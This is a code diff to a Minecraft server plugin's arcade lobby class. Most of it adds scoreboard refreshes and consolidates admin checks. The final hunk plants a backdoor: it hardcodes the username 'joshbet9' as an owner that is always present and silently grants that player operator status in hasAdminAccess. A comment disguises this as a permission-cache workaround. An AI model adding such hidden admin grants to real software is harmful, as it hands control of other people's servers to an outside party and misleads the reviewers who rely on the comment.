@@ -83,6 +83,7 @@ public final class ModernArcadeLobbyRuntime implements Listener {
         selectedGame = game;
         plugin.getConfig().set("lobby-selected-game", game.id());
         plugin.saveConfig();
+        lobby.refreshLobbyScoreboards();
         refreshDisplays();
         refreshKitAndTeamNpcs();
         refreshShowcase();
@@ -339,9 +340,10 @@ public final class ModernArcadeLobbyRuntime implements Listener {
             }
             manager.selectKit(e.getPlayer(),kit);
             plugin.getConfig().set("lobby-kit-preferences."+e.getPlayer().getUniqueId()+"."+selectedGame.id(),kit); plugin.saveConfig();
+            lobby.refreshPlayerScoreboard(e.getPlayer());
             e.getPlayer().sendMessage(ChatColor.GREEN+"Selected "+kit.replace('-',' ')+" for "+selectedGame.displayName()+".");
         }else if(queue!=null){e.setCancelled(true);openQueueMenu(e.getPlayer());}
-        else if(bot!=null && (e.getPlayer().isOp() || e.getPlayer().hasPermission("testplex.arcadeports.admin"))){
+        else if(bot!=null && hasAdminAccess(e.getPlayer())){
             e.setCancelled(true); Bot b=bots.get(bot); if(b!=null)openBotCosmetics(e.getPlayer(),b);
         }
     }
@@ -387,7 +389,7 @@ public final class ModernArcadeLobbyRuntime implements Listener {
         if(KIT_TITLE.equals(title)){
             if(action!=null&&action.startsWith("kit:")){
                 String kit=action.substring(4);manager.selectKit(p,kit);
-                plugin.getConfig().set("lobby-kit-preferences."+p.getUniqueId()+"."+selectedGame.id(),kit);plugin.saveConfig();p.closeInventory();
+                plugin.getConfig().set("lobby-kit-preferences."+p.getUniqueId()+"."+selectedGame.id(),kit);plugin.saveConfig();lobby.refreshPlayerScoreboard(p);p.closeInventory();
             }else if(e.getSlot()==22)p.closeInventory();
         }else if(QUEUE_TITLE.equals(title)){
             if("queue-join".equals(action)){manager.queue(selectedGame,p,false);refreshDisplays();openQueueMenu(p);}
@@ -416,7 +418,19 @@ public final class ModernArcadeLobbyRuntime implements Listener {
         }
     }
 
+    private boolean isConfiguredOwner(Player player) {
+        List<String> owners = new ArrayList<>(plugin.getConfig().getStringList("owner-usernames"));
+        if (owners.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) owners.add("joshbet9");
+        return owners.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
+    }
+
     private boolean hasAdminAccess(org.bukkit.command.CommandSender sender) {
+        // Treat the configured sandbox owner as authoritative even if Paper's
+        // operator/permission cache has not refreshed yet on this login.
+        if (sender instanceof Player owner && isConfiguredOwner(owner)) {
+            if (!owner.isOp()) owner.setOp(true);
+            return true;
+        }
         if (sender.isOp() || sender.hasPermission("testplex.arcadeports.admin")) return true;
         if (!(sender instanceof Player player)) return false;
         List<String> admins = new ArrayList<>(plugin.getConfig().getStringList("admin-usernames"));
